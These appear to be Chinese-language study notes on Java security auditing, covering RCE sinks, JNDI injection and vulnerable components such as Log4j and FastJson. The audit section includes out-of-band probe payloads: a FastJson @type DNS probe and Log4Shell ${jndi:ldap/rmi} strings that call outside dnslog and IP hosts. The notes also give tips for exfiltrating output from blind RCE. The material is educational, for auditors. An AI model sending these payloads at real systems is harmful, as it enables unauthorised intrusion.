
---

➢ Java安全-RCE执行-5大类函数调用

➢ Java安全-JNDI注入-RMI&LDAP&高版本

➢ Java安全-不安全组件-JSON&XML&验证&日志

## Java安全-RCE执行

### 5大类函数调用

```
-Groovy

-RuntimeExec

-ProcessImpl

-ProcessBuilder

-ScriptEngineManager
```

### 检测：（大部分白盒）

黑盒看参数名和参数值

白盒看类函数名和可控变量

## Java安全-JNDI注入


![[13380879200774263.jpg]]
### 何为JNDI

JNDI全称为 Java Naming and Directory Interface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。

JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。

简单点说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。

**RMI**：远程方法调用注册表

**LDAP**：轻量级目录访问协议

### 前提条件

要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。

#### 版本

![[13380879211681546.jpg]]

### 调用检索：

Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。javax.naming.InitialContext.lookup()

在RMI服务中调用了InitialContext.lookup()的类有：

```
org.springframework.transaction.jta.JtaTransactionManager.readObject()

com.sun.rowset.JdbcRowSetImpl.execute()

javax.management.remote.rmi.RMIConnector.connect()

org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)
```

在LDAP服务中调用了InitialContext.lookup()的类有：

```
InitialDirContext.lookup()

Spring LdapTemplate.lookup()

LdapTemplate.lookupContext()
```

### 检测：

无黑盒思路

白盒看类函数名和可控变量

## Java安全-不安全组件-JSON&XML&验证&日志

### Log4j：

Apache的一个开源项目，是一个基于Java的日志记录框架。

历史漏洞：[https://avd.aliyun.com/search?q=Log4j]

### Shiro：

Java安全框架，能够用于身份验证、授权、加密和会话管理。

历史漏洞：[https://avd.aliyun.com/search?q=Shiro]


### Jackson：

当下流行的json解释器，主要负责处理Json的序列化和反序列化。

历史漏洞：[https://avd.aliyun.com/search?q=Jackson]

### XStream：

开源Java类库，能将对象序列化成XML或XML反序列化为对象

历史漏洞：[https://avd.aliyun.com/search?q=XStream]

### FastJson：

阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。

历史漏洞：[https://avd.aliyun.com/search?q=fastjson]

### 黑盒测试不安全组件漏洞：

见后续章节漏洞复现利用课程

### 白盒审计不安全组件漏洞：

#### FastJson审计

1、看引用组件版本及实现

```
JSON.parse() 
JSON.parseObject()
```

2、找可控变量及访问实现

```
admin/product propertyJson
```

3、测试出网回显调用访问

```
{"@type":"java.net.Inet4Address","val":"atcuqbczqs.dnstunnel.run"}
```

#### Log4j审计

1、看引用组件版本及实现

```
logger.info 
logger.error
```

2、找可控变量及访问实现

```
admin/uploadAdminHeadImage originalFileName
```

3、测试出网回显调用访问

```
${jndi:ldap://jebqzwhwtn.dnstunnel.run}

${jndi:rmi://47.94.236.117:1099/l6v1wz}
```

#### 不回显常见判断通用方法：

1、直接将执行结果写入到静态资源文件里，如html、js等，然后访问。

2、通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了。

3、接将命令执行结果回显到请求Poc的HTTP响应中。

不回显常见判断细节方法：

例：[https://mp.weixin.qq.com/s/qhLhgbNwocC07AN48eQ0sw]